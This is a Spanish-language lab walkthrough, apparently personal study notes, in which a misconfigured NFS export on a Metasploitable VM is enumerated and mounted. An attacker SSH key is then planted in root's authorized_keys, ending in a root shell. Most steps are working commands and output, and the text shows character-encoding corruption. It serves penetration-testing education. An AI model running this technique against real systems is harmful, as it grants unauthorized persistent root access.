### üß© Servicio: NFS (Network File System) ‚Äì Puerto 2049.

# üéØ 1. Objetivo de la explotaci√≥n.

El objetivo es aprovechar una configuraci√≥n insegura del servicio NSF que permite:

- Enumerar los directorios exportados por el servidor.
- Montarlos remotamente desde Kali Linux.
- Acceder a informaci√≥n sensible o incluso obtener acceso a shell persistente en la m√°quina v√≠ctima, especialmente si podemos:
  - Encontrar una home de un usuario exportada.
  - Escribir dentro de ella (como meter una clave SSH).
  - Usar esto para entrar como ese usuario y, potencialmente, escalar privilegios.

# ü™™ 2. ¬øQu√© es NFS?.

NFS permite que un sistema remoto "comparta carpetas" que pueden mostrarse en otras m√°quinas como si fueran locales.

En entornos mal configurados, esto puede permitir que cualquier cliente se conecte y acceda a esas carpetas. A veces, incluso con permisos de escritura.

# üõ† 3. Pasos para explotaci√≥n de NFS.

## üîé Paso 1: Escaneo con Nmap.

```bash
sudo nmap -sV -p 2049 192.168.56.102
```

Para identificar el servicio y la versi√≥n.

## üîé Paso 2: Enumeramos recursos compartidos.

Usamos showmount para listar los directorios que la m√°quina exporta:

```bash
showmount -e 192.168.56.102
```

Nos muestra:

‚îå‚îÄ‚îÄ(javier„âøkali)-[~]
‚îî‚îÄ$ showmount -e 192.168.56.102         
Export list for 192.168.56.102:
/ *

Lo que nos indica que es extremadamente vulnerable y peligroso ya que:

- / ‚Üí El servidor est√° exportando la ra√≠z del sistema de archivos. Esto es extremadamente inseguro.
- * ‚Üí Cualquier cliente (cualquier IP) puede montar ese recurso. No hay restricciones.

‚ö†Ô∏è Esto significa que puedes montar el sistema de archivos completo del servidor en tu m√°quina Kali, sin autenticaci√≥n ni restricciones. Es como tener acceso directo al disco duro del servidor.

## üìÇ Paso 3: Crear un directorio local para montar.

Creamos un punto de montaje en nuestra m√°quina Kali:

```bash
mkdir /tmp/nfs
```

## üîó Paso 4: Montar el recurso remoto en nuestra Kali:

Usamos el comando mount para montar /.

```bash
sudo mount -t nfs 192.168.56.102:/ /tmp/nfs
```

Despu√©s de montarlo, podr√°s acceder a los archivos como si estuvieran en tu m√°quina:

```bash
ls -la /tmp/nfs
```
## üîì Paso 5: Generamos clave SSH:

```bash
ssh-keygen -f /tmp/key_nfs_root -N ''
```

Esto crear√°:

- /tmp/key_nfs_root(clave privada).
- /tmp/key_nfs_root.pub(clave p√∫blica).

## üìÇ Paso 6: Entramos en la ra√≠z montada.

```bash
cd /tmp/nfs
```

Confirmamos que podemos acceder a /root.

```bash
ls -la root
```

Si vemos archivos como .bashrc, .profile...¬°estamos dentro!

## üß± Paso 7: Creamos .ssh/ y authorized_keys

Dentro de /tmp/nfs/root:

```bash
mkdir .ssh  # si no existe
chmod 700 .ssh
cat /tmp/key_nfs_root.pub > .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
```

Ahora el sistema remoto acepta tu clave para root.

## üö™ Paso 8: Conectarnos por SSH como root.

```bash
ssh -i /tmp/key_nfs_root root@192.168.56.102
```
Si nos sale una advertencia de huella digital, aceptamos con yes.

‚ö†Ô∏è Problema: No podemos conectarnos con la clave ed25519.

Al intentar conectarte usando la clave generada anteriormente (/tmp/key_nfs_root), el sistema responde con:

```bash
Unable to negotiate with 192.168.56.102 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
```

üîç Causa

El servidor SSH en la m√°quina v√≠ctima solo acepta algoritmos de claves antiguos (ssh-rsa, ssh-dss). Nuestra clave es del tipo moderno ed25519, que no es compatible.

üîÑ Soluci√≥n: Crear una clave SSH RSA (legacy compatible).

Creamos una nueva clave compatible:

```bash
ssh-keygen -t rsa -b 2048 -f /tmp/key_rsa_compat -N ''
```

Esto genera:

- Clave privada: /tmp/key_rsa_compat
- Clave p√∫blica: /tmp/key_rsa_compat.pub

## üîÅ Paso 9: Sustituimos la clave en el archivo authorized_keys.

Copiamos la nueva clave p√∫blica al archivo authorized_keys del usuario root en el sistema montado por NFS:

```bash
cat /tmp/key_rsa_compat.pub > /tmp/nfs/root/.ssh/authorized_keys
chmod 700 /tmp/nfs/root/.ssh
chmod 600 /tmp/nfs/root/.ssh/authorized_keys
```

## üîê Paso 10: Conexi√≥n SSH usando la nueva clave.

Ya con la clave RSA insertada, nos conectamos:

```bash
ssh -i /tmp/key_rsa_compat \
    -oHostKeyAlgorithms=+ssh-rsa \
    -oPubkeyAcceptedKeyTypes=+ssh-rsa \
    root@192.168.56.102
```

‚úÖ Resultado final:

¬°Acceso root sin necesidad de conocer la contrase√±a!

```bash
Last login: Thu Aug  7 09:52:59 2025 from :0.0
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
...
root@metasploitable:~#
```

üß† Conclusiones:

- NFS mal configurado puede ser devastador: exportar / sin restricciones y sin root_squash es equivalente a regalar el sistema.
- Gracias al montaje remoto, pudimos escribir en el .ssh de root.
- La conexi√≥n por SSH requer√≠a clave tipo RSA debido a la antig√ºedad del servidor (y configuraciones inseguras).
- El resultado fue un acceso persistente como root remoto sin necesidad de ninguna contrase√±a.




